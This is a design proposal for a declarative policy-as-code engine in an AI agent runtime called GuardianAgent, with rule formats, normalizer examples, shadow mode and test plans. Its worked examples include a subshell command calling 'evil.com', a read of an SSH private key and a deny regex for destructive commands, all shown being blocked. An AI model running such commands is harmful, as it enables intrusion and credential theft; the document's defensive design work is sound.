# Proposal: Policy as Code

**Status:** Draft
**As-Built Spec:** [Policy as Code Spec](/mnt/s/Development/GuardianAgent/docs/specs/POLICY-AS-CODE-SPEC.md)

## Current Runtime Note

GuardianAgent now already ships imperative contextual enforcement in the runtime:
- principal-bound approvals
- trust-aware tool gating via `contentTrustLevel`, `taintReasons`, and `derivedFromTaintedContent`
- trust-aware memory quarantine
- bounded schedule authority via approval expiry, scope hashes, and budget caps

This spec is therefore no longer about introducing contextual security from scratch. It is about consolidating the shipped behavior into a shared declarative engine.

## Goal
Centralize GuardianAgent's scattered security and authorization decisions into a deterministic, auditable policy-as-code framework without rewriting the runtime and without adopting a heavyweight external policy language too early.

This framework should:
- preserve existing Runtime chokepoints
- make decisions explainable and testable
- reduce policy logic duplication across Guardian, ToolExecutor, and admin APIs
- remain readable to GuardianAgent developers and operators

## Decision
GuardianAgent should implement a **native declarative rule engine in TypeScript** with JSON/YAML-backed policy documents.

GuardianAgent should **not adopt Cedar in the first implementation**.

Reasons:
1. GuardianAgent is currently a single-user or small-team runtime, not a multi-tenant authorization service.
2. Cedar would add integration cost disproportionate to the problem size:
   - additional runtime or WASM dependency
   - separate entity/action schema maintenance burden
   - unfamiliar policy syntax for the likely operator base
3. GuardianAgent already exposes operator intent through config, allowlists, policy modes, and approvals. A native rule engine can formalize that intent without introducing a new language.
4. The primary problem to solve is **centralization and determinism**, not federation or cross-organization policy distribution.

## Non-Goals
- Replacing regex detectors, shell tokenization, or PII/secret scanners with policy logic
- Introducing cross-turn taint tracking in the initial release
- Supporting arbitrary end-user-authored scripting
- Rewriting all existing security logic in one release
- Building a general-purpose multi-tenant authorization platform

## Why Not Cedar Yet

### Critique 1: Cedar is heavyweight for this context
Accepted.

GuardianAgent needs a practical policy layer, not AVP-scale infrastructure. The first implementation should use:
- TypeScript interfaces as the source of truth
- policy JSON/YAML files checked into the repo
- deterministic evaluators with no external runtime dependency

Cedar remains a future option only if GuardianAgent later needs:
- multi-tenant policy isolation
- external policy delegation
- formal static analysis beyond what native rules provide
- interoperability with other policy systems

### Critique 2: abstraction cost
Accepted.

The design must have an explicit performance budget. Policy evaluation should be:
- in-process
- allocation-light
- object-based, not string-serialized
- benchmarked before enforcement rollout

### Critique 3: shadow mode without resolution process
Accepted.

Shadow mode must have a defined mismatch triage path and an exit criterion.

### Critique 4: taint tracking is architecturally significant
Accepted.

Cross-turn taint tracking is not an MVP feature. The framework should be designed to support future data labels, but the initial proposal will stop at **single-decision contextual labels** only.

### Critique 5: dual policy systems during migration
Accepted.

The migration must be time-boxed. The imperative path should remain authoritative only until parity is reached per decision family, then that family is migrated fully.

### Critique 6: policy authorship
Accepted.

The initial authors are GuardianAgent developers and maintainers. Operators continue using familiar config surfaces; config is compiled into policy context rather than asking users to author raw rules.

## Core Design

### Principle
Keep existing detectors and chokepoints. Replace ad hoc decision branching with a shared deterministic Policy Engine.

High-level flow:

```
detector/normalizer -> PolicyInput -> PolicyEngine -> PolicyDecision -> enforcer -> audit log
```

### Current chokepoints to preserve
- Guardian admission pipeline
- ToolExecutor pre-execution and approval routing
- web admin/auth endpoints
- event emission validation
- output release checks where deterministic policy is appropriate

Primary integration targets:
- `src/guardian/guardian.ts`
- `src/tools/executor.ts`
- `src/channels/web.ts`
- `src/queue/event-bus.ts`

## Architecture

### New Modules
```
src/policy/
  types.ts
  engine.ts
  rules.ts
  matcher.ts
  compiler.ts
  normalize-tool.ts
  normalize-guardian.ts
  normalize-admin.ts
  registry.ts
  shadow.ts
```

### Policy file locations
```
policies/
  schema/
    policy-rule.schema.json
  base/
    tools.json
    admin.json
    guardian.json
  presets/
    locked.json
    safe.json
    balanced.json
    power.json
```

## Evaluation Model

### Policy Engine Interface
```ts
export type PolicyDecisionKind = 'allow' | 'deny' | 'require_approval';

export interface PolicyInput {
  family: 'tool' | 'guardian' | 'admin' | 'event';
  principal: {
    kind: 'user' | 'agent' | 'system';
    id: string;
    channel?: string;
    capabilities?: string[];
    trustPreset?: string;
  };
  action: string;
  resource: {
    kind: string;
    id?: string;
    attrs?: Record<string, unknown>;
  };
  context: Record<string, unknown>;
}

export interface PolicyDecision {
  kind: PolicyDecisionKind;
  reason: string;
  ruleId?: string;
  obligations?: string[];
}

export interface PolicyEngine {
  evaluate(input: PolicyInput): PolicyDecision;
}
```

### Evaluation order
1. Build normalized `PolicyInput`
2. Evaluate matching rules in priority order
3. First terminal match wins
4. If no match, apply the family default (see below)

### Rule priority
- explicit deny (highest)
- explicit require approval
- explicit allow
- default fallback (lowest)

### Family defaults (no matching rule)

When no rule matches, the engine applies a safe default per family:

| Family | Default | Rationale |
|--------|---------|-----------|
| `tool` | **mode-dependent** (see below) | Must match current autonomous/approve behavior |
| `guardian` | `deny` | Unknown actions are not allowed through admission |
| `admin` | `deny` | Privileged actions require explicit authorization |
| `event` | `deny` | Unknown event targets are not emitted |

#### Tool family mode-dependent defaults

The tool family default depends on `context.policyMode` to preserve behavioral compatibility with the current `ToolExecutor.decide()` logic:

| `context.policyMode` | `context.isReadOnly` | Default |
|----------------------|---------------------|---------|
| `autonomous` | any | `allow` |
| `approve_by_policy` | `true` | `allow` |
| `approve_by_policy` | `false` | `require_approval` |
| `approve_each` | `true` | `allow` |
| `approve_each` | `false` | `require_approval` |

These defaults are expressed as low-priority fallback rules in `policies/base/tools.json`, not hardcoded in the engine. This means they are visible, auditable, and overridable — but they ship as part of the base policy set.

**Important:** `autonomous` mode defaulting to `allow` is intentional and matches current behavior. The policy engine does not impose deny-by-default on autonomous mode. Operators who want deny-by-default must use `approve_by_policy` or `approve_each`, or add explicit deny rules.

## Rule Format

The rule format should be simple enough to read and diff in code review.

### Schema version

Every policy file must include a top-level `schemaVersion` field:

```json
{
  "schemaVersion": 1,
  "rules": [ ... ]
}
```

The engine must reject files with an unrecognized `schemaVersion`. When the rule schema changes in a future release, the version is bumped and a migration script is provided. This prevents silent policy drift on upgrades.

### Rule structure

```json
{
  "id": "tool.fs_write.manual",
  "family": "tool",
  "enabled": true,
  "priority": 200,
  "description": "Require approval for fs_write when tool policy is manual.",
  "match": {
    "action": "tool.run",
    "resource.kind": "tool",
    "resource.id": "fs_write",
    "context.toolPolicy": "manual"
  },
  "decision": {
    "kind": "require_approval",
    "reason": "fs_write requires manual approval."
  }
}
```

### Compound conditions

All conditions within a `match` block are implicitly `allOf` — every condition must be true for the rule to match.

For disjunctive (OR) logic, use `anyOf` at the top level of `match`:

```json
{
  "id": "tool.shell.deny-unsafe-operator",
  "family": "tool",
  "enabled": true,
  "priority": 100,
  "description": "Deny shell_safe if any control operator is detected.",
  "match": {
    "action": "tool.run",
    "resource.id": "shell_safe",
    "anyOf": [
      { "context.hasSubshell": true },
      { "context.hasPipeOperator": true },
      { "context.hasSemicolon": true },
      { "context.hasBacktick": true }
    ]
  },
  "decision": {
    "kind": "deny",
    "reason": "Shell control operator detected."
  }
}
```

Nesting rules:
- `match` is implicitly `allOf` across its top-level conditions
- `anyOf` is an array of condition sets; at least one must match
- `allOf` can be explicit for readability but is the default
- `anyOf` and `allOf` may contain each other to one level of nesting (no recursive depth)
- Deeply nested boolean trees are a sign the rule should be split into multiple rules

### Match primitives

| Primitive | Syntax | Example |
|-----------|--------|---------|
| exact equality | `"field": "value"` | `"resource.id": "fs_write"` |
| `in` (value in set) | `"field": { "in": [...] }` | `"context.risk": { "in": ["mutating", "external_post"] }` |
| `notIn` | `"field": { "notIn": [...] }` | `"context.risk": { "notIn": ["read_only"] }` |
| boolean | `"field": true` | `"context.isReadOnly": true` |
| numeric comparison | `"field": { "gt": n }` | `"context.argSizeBytes": { "gt": 131072 }` |
| string prefix | `"field": { "startsWith": "..." }` | `"resource.attrs.path": { "startsWith": "/tmp/" }` |
| string suffix | `"field": { "endsWith": "..." }` | `"resource.attrs.path": { "endsWith": ".env" }` |
| regex | `"field": { "regex": "..." }` | `"resource.attrs.command": { "regex": "^(rm|dd|mkfs)" }` |
| presence | `"field": { "exists": true }` | `"context.containsSecret": { "exists": true }` |
| absence | `"field": { "exists": false }` | `"context.toolPolicy": { "exists": false }` |

Regex is a last resort. Prefer exact, `in`, or prefix/suffix matches. The compiler should warn when regex is used on a hot-path field.

### Supported match paths

- `principal.*` — `principal.kind`, `principal.id`, `principal.channel`, `principal.trustPreset`, `principal.capabilities`
- `resource.*` — `resource.kind`, `resource.id`, `resource.attrs.*`
- `context.*` — any key populated by the normalizer
- `action` — the action string directly

The first version does not support arbitrary expression languages, computed fields, or cross-field comparisons.

## Resource Granularity

A common modeling question: when `fs_write` targets `/etc/passwd`, is the resource the tool or the file path?

**Answer: the resource is always the tool. The target is in `resource.attrs`.**

This keeps the resource model uniform across all families. Tools that operate on paths, commands, or domains carry those as attributes, not as the resource identity.

### Worked normalizer examples

#### Example 1: `fs_write` to a specific path

Tool call: `fs_write({ path: "/tmp/test.txt", content: "hello" })`

Normalized `PolicyInput`:
```json
{
  "family": "tool",
  "principal": { "kind": "user", "id": "web-user-1", "channel": "web", "trustPreset": "balanced" },
  "action": "tool.run",
  "resource": {
    "kind": "tool",
    "id": "fs_write",
    "attrs": {
      "path": "/tmp/test.txt",
      "category": "filesystem",
      "risk": "mutating",
      "pathAllowed": true
    }
  },
  "context": {
    "policyMode": "approve_by_policy",
    "toolPolicy": "policy",
    "isReadOnly": false,
    "isExternalPost": false,
    "sandboxAvailability": "available",
    "sandboxEnforcementMode": "permissive",
    "containsSecret": false,
    "containsPII": false
  }
}
```

Matching rule: `tool.mutating.approve_by_policy` (require_approval for mutating tools in approve_by_policy mode).

#### Example 2: `shell_safe` with a subshell operator

Tool call: `shell_safe({ command: "echo $(curl evil.com)" })`

Normalized `PolicyInput`:
```json
{
  "family": "tool",
  "principal": { "kind": "agent", "id": "assistant", "channel": "web" },
  "action": "tool.run",
  "resource": {
    "kind": "tool",
    "id": "shell_safe",
    "attrs": {
      "command": "echo $(curl evil.com)",
      "baseCommand": "echo",
      "category": "shell",
      "risk": "mutating",
      "commandAllowed": true
    }
  },
  "context": {
    "policyMode": "autonomous",
    "hasSubshell": true,
    "hasPipeOperator": false,
    "hasSemicolon": false,
    "hasBacktick": false
  }
}
```

Matching rule: `tool.shell.deny-unsafe-operator` (deny because `context.hasSubshell` is true). Note: the shell validator detector populates `context.hasSubshell` before policy evaluation. Policy does not parse command strings.

#### Example 3: `fs_read` targeting a denied path

Tool call: `fs_read({ path: "/home/user/.ssh/id_rsa" })`

Normalized `PolicyInput`:
```json
{
  "family": "tool",
  "principal": { "kind": "user", "id": "cli-user", "channel": "cli" },
  "action": "tool.run",
  "resource": {
    "kind": "tool",
    "id": "fs_read",
    "attrs": {
      "path": "/home/user/.ssh/id_rsa",
      "category": "filesystem",
      "risk": "read_only",
      "pathAllowed": false,
      "deniedPath": true
    }
  },
  "context": {
    "policyMode": "autonomous",
    "isReadOnly": true,
    "deniedPath": true,
    "deniedPathPattern": "id_rsa*"
  }
}
```

Matching rule: `tool.deny-denied-path` (deny when `resource.attrs.deniedPath` is true). The denied-path detector normalizes the path and sets the flag; policy consumes the flag.

#### Example 4: admin privileged ticket action

API call: `POST /api/auth/config` with valid ticket

Normalized `PolicyInput`:
```json
{
  "family": "admin",
  "principal": { "kind": "user", "id": "web-admin", "channel": "web" },
  "action": "auth.config.update",
  "resource": {
    "kind": "auth_config",
    "id": "token_rotation"
  },
  "context": {
    "hasValidTicket": true,
    "ticketAction": "auth.config.update",
    "ticketExpired": false,
    "ticketReplay": false
  }
}
```

Matching rule: `admin.ticket.allow-valid` (allow when `context.hasValidTicket` is true and `context.ticketAction` matches `action` and `context.ticketReplay` is false).

### Normalizer responsibility

Each normalizer (`normalize-tool.ts`, `normalize-guardian.ts`, `normalize-admin.ts`) is responsible for:
1. Extracting relevant fields from the request into `resource.attrs`
2. Running detectors and populating `context` with their boolean/string outputs
3. Resolving allowlist membership (`pathAllowed`, `commandAllowed`, `domainAllowed`)
4. Never making authorization decisions — normalizers produce facts, not outcomes

## What stays outside policy
These remain detector or parser responsibilities:
- shell tokenization and operator detection
- secret scanning
- PII scanning
- denied-path normalization
- prompt-injection heuristics
- audit hash-chain verification

Policy consumes detector outputs as facts. Example:
- `context.hasSubshell = true`
- `context.deniedPath = true`
- `context.containsSecret = true`
- `context.containsPII = true`

## Policy Families

### 1. Tool policy
Scope:
- allow / deny / require approval for tool execution
- path/domain/command allowlists
- sandbox-health-dependent availability
- external posting rules
- trust-preset-aware default behavior

Example actions:
- `tool.run`
- `tool.approve`
- `tool.policy.update`

### 2. Guardian admission policy
Scope:
- capability enforcement
- denied path outcomes
- shell validation outcomes
- detector-driven blocks before tool execution

Example actions:
- `guardian.action.check`
- `guardian.message.admit`

### 3. Admin policy
Scope:
- privileged ticket-gated routes
- auth config mutation
- connector/playbook mutation
- config category updates

Example actions:
- `auth.ticket.issue`
- `auth.config.update`
- `config.update`
- `connectors.update`

### 4. Event policy
Scope:
- allowed emit targets
- whether event payloads with certain labels should be blocked

Example actions:
- `event.emit`

## Integration Plan

### Phase 1: Tool policy only
Authoritative target:
- `src/tools/executor.ts`

Why first:
- most risky side effects already funnel through tools
- existing policy model is already close to declarative
- easy to compare old and new decisions

Initial normalized fields:
- `resource.id = toolName`
- `context.risk`
- `context.toolPolicy`
- `context.policyMode`
- `context.allowedPath`
- `context.allowedCommand`
- `context.allowedDomain`
- `context.sandboxAvailability`
- `context.sandboxEnforcementMode`
- `context.isExternalPost`
- `context.isReadOnly`

### Phase 2: Admin/auth policy
Authoritative target:
- `src/channels/web.ts`

Use cases:
- privileged ticket requirement
- auth reveal/config/rotate gates
- connector/playbook config mutation
- future policy mutation controls

### Phase 3: Guardian admission family
Authoritative target:
- `src/guardian/guardian.ts`

This phase migrates capability/path/command-family decisions into the engine while keeping scanners and validators intact.

### Deferred: cross-turn data-flow labels
Not in scope for initial implementation.

The initial framework may support ephemeral per-decision labels in `context`, but no persistent taint graph or memory-propagated label model will be attempted in this spec.

## Performance Budget

This framework must not materially degrade interactive responsiveness.

Budget:
- policy evaluation target: under `0.25 ms` p50 per decision
- under `1 ms` p95 per decision on a normal developer workstation
- zero JSON serialization between normalizer and engine
- no child process, no WASM, no network call

Implementation constraints:
- evaluate plain objects in-process
- precompile rules into match functions at startup
- cache compiled policies
- avoid dynamic regex creation during hot path

Benchmark requirements:
1. 10K tool decisions in-process benchmark
2. 10K admin decisions in-process benchmark
3. compare pre-policy and post-policy `tool.run` overhead
4. fail CI if overhead exceeds agreed threshold

## Shadow Mode

### Purpose
Run the new Policy Engine alongside legacy imperative logic while legacy remains authoritative.

### Required logging
Every shadow-evaluated decision must log:
- decision family
- normalized action/resource summary
- legacy decision
- policy decision
- matched `ruleId`
- mismatch class

### Mismatch classes
- `policy_too_strict`
- `policy_too_permissive`
- `normalization_bug`
- `legacy_bug`
- `unknown`

### Comparison semantics

Shadow mode compares **decision kind only**, not side effects.

Legacy logic produces decisions AND side effects (creating approval records, updating job status, emitting audit events). The shadow policy engine produces only a `PolicyDecision` value. Comparison is:

| Legacy outcome | Policy decision | Match? |
|---------------|----------------|--------|
| `allow` (tool runs) | `allow` | yes |
| `require_approval` (approval created) | `require_approval` | yes |
| `deny` (tool blocked) | `deny` | yes |
| `allow` | `require_approval` | MISMATCH: `policy_too_strict` |
| `allow` | `deny` | MISMATCH: `policy_too_strict` |
| `deny` | `allow` | MISMATCH: `policy_too_permissive` |
| `require_approval` | `allow` | MISMATCH: `policy_too_permissive` |

Shadow mode does NOT:
- create approval records from policy decisions
- execute tools based on policy decisions
- modify job status based on policy decisions

Shadow mode DOES:
- log the full `PolicyInput` for every mismatch (for reproduction)
- increment per-family mismatch counters exposed via `/api/policy/shadow`
- include `policyRuleId` in the log so the offending rule is immediately identifiable

### Resolution workflow
Every mismatch must be triaged into one of:
1. fix the policy rule
2. fix the normalizer
3. fix the legacy code
4. mark intended divergence and document it

Shadow mode is not open-ended. Exit criteria per family:
- 0 critical mismatches for 14 consecutive days
- no unexplained `policy_too_permissive` mismatches
- regression tests added for every fixed mismatch category

## Migration and Decommissioning

The project must not maintain two decision systems indefinitely.

### Family-by-family migration rule
For each policy family:
1. implement normalizer
2. enable shadow mode
3. resolve mismatches
4. flip family to policy-authoritative
5. delete equivalent imperative branching

### Initial decommissioning targets
1. Tool decision logic in `ToolExecutor`
2. Admin-route auth/config gating logic in `WebChannel`
3. Guardian capability + allowlist decision branches

The imperative path should remain only for:
- detector implementations
- parsing/normalization
- enforcement side effects

## Policy Ownership

### Initial authors
- GuardianAgent maintainers
- repository contributors modifying runtime security behavior

### Operator role
Operators should not be asked to write raw rules in the initial release.

Operators continue to express intent through:
- config
- trust presets
- tool policy modes
- allowlists
- approval settings

The runtime compiles operator config into `PolicyInput.context`.

### UI implications
No general raw rule editor in the first release.

Possible future UI:
- rule viewer
- matched rule id in audit/details
- explanation panel in web tools/config pages

## Trust Preset Integration

Trust presets remain first-class operator UX.

The policy engine should consume trust preset outputs as facts, not replace the preset UX.

Example:
- `principal.trustPreset = balanced`
- `context.policyMode = approve_by_policy`
- `context.defaultCapabilities = [...]`

Preset policy files may exist only to capture default rule overlays, not to force users into writing policy.

## Audit and Explainability

Every authoritative policy decision should be auditable.

Audit additions:
- `policyFamily`
- `policyAction`
- `policyResource`
- `policyDecision`
- `policyRuleId`
- `policyReason`

This should integrate with existing audit logging and hash-chain persistence.

## Example Rules to Port First

### Tool family
1. deny unknown tool names
2. deny when category disabled by strict sandbox mode
3. require approval when per-tool policy is `manual`
4. deny when per-tool policy is `deny`
5. require approval for `external_post`
6. deny path outside allowlist
7. deny command outside allowlist
8. deny domain outside allowlist
9. allow read-only tool in `approve_by_policy`
10. require approval for mutating tool in `approve_each`

### Admin family
1. deny privileged mutation without valid ticket
2. deny ticket action mismatch
3. deny replayed ticket
4. allow valid ticket for matching action

### Guardian family
1. deny unknown action type
2. deny missing capability
3. deny denied-path access
4. deny shell command with subshell/control operator

## Data Labels and Taint Tracking

### Decision for this spec
Do not implement persistent cross-turn taint tracking in the first policy-as-code framework.

Reason:
- it affects conversation storage
- summarization/compaction would need label preservation
- memory persistence would need schema changes
- tool-result wrapping and downstream synthesis would need end-to-end label handling

That is a separate architectural project.

### Allowed now
Ephemeral single-decision labels in `context`, such as:
- `containsSecret`
- `containsPII`
- `toolOutputUntrusted`

These labels exist only for the current decision and are not persisted as general-purpose taint state.

## Policy Loading and Reload

### Startup behavior

At startup, the engine:
1. Reads all policy files from `rulesPath`
2. Validates `schemaVersion` on each file
3. Parses and validates all rules
4. Compiles match conditions into matcher functions
5. Sorts rules by priority within each family
6. Logs rule count per family and any validation warnings

Invalid rules are logged and skipped — they do not prevent startup. A startup with 0 valid rules in an enabled family logs a warning but does not error.

### Hot reload

Policy files support hot reload via `SIGHUP` or the admin API (`POST /api/policy/reload`).

On reload:
1. Re-read all files from `rulesPath`
2. Validate and compile the new rule set
3. If validation succeeds, atomically swap the active rule set
4. If validation fails, keep the existing rules and log the error
5. Emit an audit event: `policy_reloaded` with old/new rule counts

Hot reload does NOT require a process restart. File-watch (`fs.watch`) is not used in the initial implementation — reload is explicit only. Automatic file-watch may be added later as an opt-in.

### Operator-config-driven context refresh

When operator config changes (e.g. trust preset change, allowlist update via web UI), the normalizers automatically pick up the new config values on the next evaluation. Policy rules do not need to be reloaded for config-driven context changes — those are computed fresh on each `PolicyInput` construction.

## Configuration Additions

Suggested config shape:

```yaml
assistant:
  policy:
    enabled: true
    mode: shadow            # off | shadow | enforce
    families:
      tool: shadow
      admin: off
      guardian: off
      event: off
    rulesPath: ./policies
    mismatchLogLimit: 5000
```

Mode semantics:
- `off`: legacy logic only
- `shadow`: evaluate policy, log mismatches, legacy authoritative
- `enforce`: policy authoritative for enabled families

## Error Handling and Fail-Safe Behavior

### Engine errors

If the policy engine throws during evaluation (bug in matcher, corrupted state, etc.):
- **Shadow mode**: log the error, continue with legacy decision. Do not crash.
- **Enforce mode**: **fail closed** — return `deny` with reason `"policy engine error"`. Do not fall back to legacy logic in enforce mode, because the legacy path will have been removed for that family.

### Malformed rules

Rules that fail validation at load time are skipped with a warning. They are not silently ignored — the warning includes the rule `id` and the validation error.

A policy file with `schemaVersion` that is newer than the engine supports is rejected entirely (not partially loaded). This prevents running against a policy format the engine does not understand.

### Missing policy files

If `rulesPath` does not exist or contains no files:
- **Shadow mode**: no-op (no policy decisions to compare, no mismatches logged)
- **Enforce mode**: all families with no loaded rules use their family default. This is safe because family defaults are conservative (deny for admin/guardian/event, mode-dependent for tool).

## Test Plan

### Unit tests (`src/policy/*.test.ts`)

#### Rule loading and validation
- valid rule parses and compiles
- missing required fields rejected with error
- unknown `schemaVersion` rejects entire file
- disabled rule (`enabled: false`) is loaded but never matches
- duplicate rule `id` within a file logs warning

#### Matcher semantics
- exact string match
- `in` / `notIn` with string arrays
- boolean match (`true` / `false`)
- numeric comparisons: `gt`, `gte`, `lt`, `lte`
- `startsWith` / `endsWith`
- `regex` match
- `exists: true` / `exists: false`
- nested path resolution (`resource.attrs.path`)
- missing path returns no match (not error)

#### Compound conditions
- implicit `allOf`: all conditions must match
- explicit `anyOf`: at least one sub-condition matches
- `allOf` + `anyOf` combined: outer `allOf` with inner `anyOf`
- empty `anyOf` array matches nothing
- single-element `anyOf` behaves like `allOf`

#### Evaluation ordering
- higher-priority rule wins over lower
- deny beats allow at same priority
- first match wins among same-priority same-kind rules
- family default applies when no rules match

#### Family defaults
- tool family: autonomous → allow
- tool family: approve_by_policy + read_only → allow
- tool family: approve_by_policy + mutating → require_approval
- tool family: approve_each + mutating → require_approval
- admin family: no match → deny
- guardian family: no match → deny
- event family: no match → deny

#### Normalizers
- `normalize-tool`: populates `resource.attrs.path` from `fs_write` args
- `normalize-tool`: populates `resource.attrs.command` from `shell_safe` args
- `normalize-tool`: populates detector flags (`containsSecret`, `deniedPath`, etc.)
- `normalize-tool`: resolves allowlist membership into boolean context
- `normalize-admin`: populates ticket validity context
- `normalize-guardian`: populates capability check context

#### Error handling
- engine error in shadow mode → logs error, returns no decision
- engine error in enforce mode → returns deny
- malformed rule skipped, valid rules still loaded
- hot reload with invalid file → keeps existing rules

### Integration tests

Extend focused harnesses (`test-security-api.ps1`, `test-security-content.ps1`) to assert policy-backed behavior:
- tool approval decisions include `policyRuleId` in response
- denied-path enforcement returns `policyReason`
- admin ticket gating returns `policyRuleId`
- sandbox strict-mode deny includes policy explanation

### Shadow-mode tests
- legacy allow / policy allow → no mismatch logged
- legacy allow / policy deny → `policy_too_strict` logged
- legacy deny / policy allow → `policy_too_permissive` logged
- legacy require_approval / policy allow → `policy_too_permissive` logged
- mismatch log includes full `PolicyInput` for reproduction
- mismatch counter increments per family
- `/api/policy/shadow` returns current mismatch counts

### Benchmark tests
- 10K tool-family evaluations complete in under 2.5 seconds (0.25ms each)
- 10K admin-family evaluations complete in under 2.5 seconds
- single evaluation with 50 rules completes in under 1ms p95
- no memory allocation growth over 100K evaluations (no leaks in compiled matchers)

## Implementation Sequence

### Milestone 1
- add `src/policy/*` scaffolding
- add rule schema and loader
- implement tool-family engine
- implement shadow mode in `ToolExecutor`
- benchmark hot path

### Milestone 2
- migrate tool-family enforcement to policy-authoritative
- remove equivalent imperative branching from `ToolExecutor`
- add audit explainability fields

### Milestone 3
- add admin-family rules and normalizer
- migrate privileged ticket/config mutations

### Milestone 4
- add guardian-family rules
- migrate capability/allowlist family decisions

## Success Criteria
- policy decisions are centralized and visible
- no measurable user-facing latency regression beyond agreed budget
- tool-family legacy branching removed after parity
- admin-family privileged gating expressed through shared policy engine
- policy review becomes possible in code review without tracing multiple files

## Future Revisit Criteria for Cedar
Reconsider Cedar only if GuardianAgent needs one or more of:
- multiple tenants with isolated principals/resources
- external policy authoring outside the repo
- shared policy federation across deployments
- formal analysis features not feasible with native rules
- interoperability with an external authorization platform

Until then, the native declarative engine is the preferred path.
